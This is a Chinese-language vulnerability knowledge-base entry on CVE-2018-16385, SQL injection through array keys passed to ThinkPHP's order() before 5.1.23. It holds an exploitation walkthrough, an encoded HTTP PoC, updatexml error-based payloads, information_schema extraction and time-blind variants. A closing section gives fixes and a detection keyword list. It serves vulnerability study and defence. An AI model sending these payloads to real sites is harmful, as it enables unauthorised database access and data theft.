---
id: web-generic-sqli-thinkphp5-order-array-key-field-injection
title: ThinkPHP 5.1.23 之前 order() 接受数组时 key 进 field() 拼接：parseDataBind 铸入 :data__ 前缀后用反引号逃逸报错注入（CVE-2018-16385）
type: scenario
domain: web
path: web/generic/sqli
technique: thinkphp5-order-array-key-field-injection
tags:
- php
- thinkphp
- sqli
- order-by
- array-injection
- field-function
- updatexml
cve:
- CVE-2018-16385
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: ThinkPHP < 5.1.23
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:37:44+08:00'
  notes: 已对照原文核对：order 数组 key 进 parseOrderField→parseDataBind 加 :data__ 前缀→parseKey(strict=true) 包反引号、field() 至少两参与首参须为合法字段、最终 SQL 与 XPATH 报错回显均与原文图02-07及图05 断点一致；已修正原理中 parseKey 自相矛盾的一段；未验证点：原文仅 MySQL updatexml 实测，其它报错/时间盲注函数为等价替换
url: /docs/web/generic/sqli/web-generic-sqli-thinkphp5-order-array-key-field-injection/
draft: false
kb_aliases:
- CVE-2018-16385
- ThinkPHP order by 数组注入
- parseOrder parseOrderField
- field() 函数注入
- updatexml 报错注入 field
---

## 一句话结论

ThinkPHP 5.1.23 之前，`Query::order()` 直接把用户传入的数组交给 `Builder::parseOrder()`，数组的 **key** 被 `parseOrderField()` 当成排序字段名，再经 `parseDataBind()` 拼上 `:data__` 前缀、经 `parseKey()` 包上反引号，最终塞进 `ORDER BY field(<key>,<val>)` 里；因为字段名位置上没有任何转义，提交 `order[<注入串>]=1` 即可跳出 `field()` 执行报错注入（如 `updatexml`），拿到数据库信息。

## 原理

- **入口接受数组**：控制器里常见 `$order = $_GET['order']; db('user')->where($data)->order($order)->find();`。`order()` 支持字符串（`'id desc'`）与数组（`['id'=>'desc']` 或 `['字段'=>值]`）两种形态，数组形态会把 key 当字段名、value 当排序方向/`field` 的参数。
- **`parseOrder()` 的分派**：`foreach ($val as $key => $val)` 后判断，数组元素再走 `parseOrderField($query, $key, $val)`；最终 `return ' ORDER BY ' . implode(',', $array);`。
- **`parseOrderField()` 的拼接公式**：`return 'field(' . $this->parseKey($query, $key, true) . ',' . implode(',', $val) . ')' . $sort;`。`$val` 只是 `field()` 的附加参数（用于 `field('id', '1,2,3')` 这种"按给定顺序排"的场景），真正的注入位是 `$key`。
- **`parseDataBind()` 加前缀**：`parseKey` 之前的 `parseDataBind` 会把 key 处理成 `:data__<key>` 形式（绑定参数占位符命名），这一步让输入变成 `:data__id`,111)|updatexml(...)#0` 这样的拼接片段。
- **`parseKey()` 包反引号**：MySQL 驱动的 `parseKey` 判断 `if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) { $key = '`' . $key . '`'; }`。本链调用时 `$strict=true`，因此**无论 key 里含什么字符都会在两端补反引号**：中间结果即 `` `id`,111)|updatexml(1,concat(0x3a,user()),1)#` ``（原文图05 断点处 `$strict: true`、`$key` 已带首反引号），注入串里的 `)` 闭合 `field(`、`#` 把末尾反引号与后续 `:data__id` 片段一并注释掉，反引号不成对也不报错。
- **最终 SQL**：`SELECT * FROM \`user\` WHERE \`id\` IN (:where_AND_id_in_1,:where_AND_id_in_2) ORDER BY field(\`id\`,111)|updatexml(1,concat(0x3a,user()),1)#\`,:data__id\`,111)|updatexml(1,concat(0x3a,user()),1)#0) LIMIT 1` —— `#` 之后整段被注释，`updatexml` 在 `ORDER BY` 求值时执行，报错回显 `XPATH syntax error: ':root@localhost'`。
- **`field()` 的两个利用约束**：`field()` 至少要有两个参数才不会报"参数不足"，所以在 payload 里补一个 `,111`；`field()` 的**第一个**参数必须是合法字段（这里被 `parseKey` 加反引号强制成字段名），因此注入只能发生在第一个参数闭合后的位置，利用形态固定为 `key = "合法字段`,<数字>)|<函数>#`。
- **为什么这是"数组 key 注入"而不是普通 order by 注入**：字符串形态的 `order('id desc')` 走的是另一条解析（按空格切分字段与方向），而数组形态让**数组下标**进入字段名位置，绕过了对"字段名"的正则校验路径。

## 触发条件

- 目标 ThinkPHP < 5.1.23（漏洞在 `Builder::parseOrder/parseOrderField` 的数组分支）。
- 应用把用户可控的数组直接传给 `order()`（如 `order($_GET['order'])`、`order($request->param('order'))`），没有先把它转成字符串或做字段白名单。
- 数据库为 MySQL（依赖 `updatexml` 报错回显；其他库可换等价报错/时间函数）。
- 查询本身能执行（`where` 条件不阻断），且报错信息回显给客户端（debug 打开或异常页泄露）。

## 利用步骤

1. 确认参数被当数组解析：提交 `?order[id]=desc` 观察结果排序是否变化（PHP 会把 `order[id]` 解析成数组）。
2. 判定可注入：`?order[id`,1)]=1`（urlencode 后）观察是否报 SQL 语法错误 —— 报错说明 key 已进入语法层。
3. 构造报错注入：`?order[id`,111)|updatexml(1,concat(0x3a,user()),1)%23]=1`，观察回显 `XPATH syntax error: ':root@localhost'`。
4. 换 `concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()))` 逐段取数据。
5. 若 `updatexml` 被过滤，换 `extractvalue(1,concat(0x7e,<payload>))`、`exp(~(select * from(select ...)a))` 或时间盲注 `if(...,sleep(5),0)`。

## PoC

```http
GET /index/Index/sql?order%5Bid%60%2C111%29%7Cupdatexml%281%2Cconcat%280x3a%2Cuser%28%29%29%2C1%29%23%5D=1 HTTP/1.1
Host: target
```

解码后的参数：

```text
order[id`,111)|updatexml(1,concat(0x3a,user()),1)#]=1
```

控制器侧被利用的代码形态：

```php
public function sql(){
    $data = ['id' => ['eq','test']];
    $order = $_GET['order'];                 // 攻击者传数组
    $m = db('user')->where($data)->order($order)->find();
    dump($m);
}
```

实际拼出的 SQL（`#` 之后被注释）：

```sql
SELECT * FROM `user`
WHERE `id` IN (:where_AND_id_in_1,:where_AND_id_in_2)
ORDER BY field(`id`,111)|updatexml(1,concat(0x3a,user()),1)#`,:data__id`,111)|updatexml(...)#0)
LIMIT 1
```

报错回显：

```text
SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':root@localhost'
```

## 变体与关联

- 变体：把 `updatexml` 换成 `extractvalue`/`floor(rand()*2)`/`exp()` 做报错注入；无回显时用 `if(substr(...)=...,sleep(3),0)` 时间盲注。
- 变体：`order` 的 value 位（`field()` 的第二个参数）同样可控，但它只被 `implode(',', $val)` 拼接，不含引号时也可作为注入位，形态更简单（`order[id]=1,111)|updatexml(...)#`）。
- 关联：[[web-generic-sqli-java-identifier-table-order-by-injection]]（标识符位置无法预编译的通用原理）、[[web-generic-sqli-thinkphp-where-exp-array-injection]]（ThinkPHP 生态里另一处"信任用户可控数组"的注入）、[[web-php-framework-thinkphp-debug-sql-error-env-credential-leak]]（用报错页拿数据库凭据）。
- 边界：应用把 `order` 强制转成字符串并做 `in_array` 字段白名单、或升级到 5.1.23+ 时失效；PDO 仿真预处理关闭且确实使用了参数绑定也会让注入点行为变化（但 key 位在语法层，绑定无效）。

## 检测与防御

- 修复：`order()` 的字段名只接受白名单（`['id','create_time',...]` 中取），禁止把请求数组直接传入；升级到 5.1.23+。
- 加固：错误页关闭 debug/不返回 SQL 异常文本；数据库账号最小权限；`information_schema` 访问收紧只能降低收益。
- 检测：请求参数名/值中出现反引号、`)`、`|`、`#`、`updatexml`、`extractvalue`、`concat`、`sleep(`；SQL 日志里 `ORDER BY field(` 后跟非常规内容；大量产生 SQL 语法错误的请求来自同一来源。
